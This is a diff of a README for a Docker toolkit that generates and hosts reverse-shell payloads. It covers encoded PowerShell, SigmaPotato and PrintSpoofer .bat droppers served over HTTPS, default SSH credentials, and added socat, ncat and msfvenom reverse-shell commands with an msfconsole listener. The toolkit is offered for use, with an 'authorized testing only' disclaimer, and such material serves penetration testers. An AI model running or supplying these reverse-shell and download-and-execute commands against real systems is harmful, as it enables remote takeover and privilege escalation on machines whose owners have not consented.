@@ -22,10 +22,17 @@ This project provides a **simple and modular Bash-based Reverse Shell Docker con
 
 ---
 
-## 🚀 Quick Start
+## 🧱 Build the Docker Image
 
 ```bash
 docker build -t reverse-shell .
+```
+
+---
+
+## 🧪 Run the Container
+
+```bash
 docker run -it --rm \
   -v $(pwd)/logs:/app/logs \
   -v $(pwd)/www:/usr/share/nginx/html \
@@ -35,45 +42,132 @@ docker run -it --rm \
 
 ---
 
-## 🧾 Web Payload Generator
+## 🔐 Access Details
 
-Visit:
+| Service        | Access Info                                     |
+|----------------|-------------------------------------------------|
+| HTTPS Payloads | https://<your_ip>/                              |
+| Web Generator  | https://<your_ip>/payload_generator.html        |
+| SSH Access     | ssh ssh_admin@<your_ip> -p 2222 (pw: ssh_admin) |
+
+---
+
+## 🧾 Payload Generator (Web UI)
+
+📍 Visit:  
 ```
 https://<your_ip>/payload_generator.html
 ```
 
-Enter your IP and Port to dynamically generate:
-- Base64 PowerShell
+📥 Input your IP and Port.  
+🔐 It dynamically shows:
+
+- Base64-encoded PowerShell
 - SigmaPotato
 - PrintSpoofer
 
 ---
 
-## 📁 CLI Payload Generator
+## 🔧 CLI-Based Generator
 
-After container starts, you'll be prompted to enter IP and Port. This will:
-- Create encoded payloads
-- Save them to `/usr/share/nginx/html/reverse_payloads.txt`
+When the container starts, it will prompt you for:
+
+- Your Attacker IP
+- Your Listening Port
+
+This will:
+
+- Generate encoded PowerShell payloads
+- Output payloads to `/usr/share/nginx/html/reverse_payloads.txt`
 - Print to screen
 
 ---
 
-## 🔐 Access
+## 🧷 Auto-Generated `.bat` Files
 
-| Service       | Details                        |
-|---------------|--------------------------------|
-| HTTPS         | https://<your_ip> (port 443)   |
-| SSH           | ssh_admin / ssh_admin (port 2222) |
-| Web Generator | `/payload_generator.html`      |
+These are served from the container's `/usr/share/nginx/html`:
 
----
+- `auto_sigma_https.bat`  
+  ➤ Downloads and executes SigmaPotato over HTTPS
 
-## 🛠️ Notes
+- `auto_printspoofer_https.bat`  
+  ➤ Downloads PrintSpoofer and injects encoded PowerShell
 
-- Adjust IP/Port live at runtime via prompts
-- All files hosted from `/usr/share/nginx/html`
-- Logs and payloads saved under `logs/` and `www/` via volume mounts
+Update IP and Port inside `.bat` manually or regenerate with the CLI.
 
 ---
 
-> ⚠️ This is for **authorized testing only**. Unauthorized use is illegal and unethical.
+## 🧬 Additional Payload Examples
+
+### 🔹 Socat (encrypted shell)
+
+**Attacker:**
+```bash
+socat openssl-listen:4444,reuseaddr,fork,cert=cert.pem,key=key.pem,verify=0 -
+```
+
+**Victim:**
+```bash
+socat openssl:attacker_ip:4444,verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane
+```
+
+---
+
+### 🔹 Ncat (SSL reverse shell)
+
+**Attacker:**
+```bash
+ncat -lvnp 5555 --ssl
+```
+
+**Victim:**
+```bash
+ncat --ssl attacker_ip 5555 -e /bin/bash
+```
+
+---
+
+### 🔹 MSFVenom Payload
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > www/rev_shell.exe
+```
+
+**Start Listener:**
+```bash
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/shell_reverse_tcp
+set LHOST <your_ip>
+set LPORT 4444
+run
+```
+
+---
+
+## 🔐 HTTPS Support (NGINX)
+
+Built-in HTTPS support using NGINX and a self-signed cert:
+
+- Mounted at: `/etc/nginx/cert.pem` and `/etc/nginx/key.pem`
+- Default TLS port: `443`
+- Hosts everything in `/usr/share/nginx/html`
+
+---
+
+## 🗂 Docker Volumes
+
+| Host Folder | Container Mount Path         | Purpose               |
+|-------------|------------------------------|------------------------|
+| `./logs`    | `/app/logs`                  | Output logs            |
+| `./www`     | `/usr/share/nginx/html`      | Web payload hosting    |
+
+---
+
+## ⚠️ Legal Disclaimer
+
+> This toolkit is intended **for authorized testing only**.  
+> Unauthorized use is illegal and unethical.  
+> Always get written permission before testing any system you do not own.
+
+---
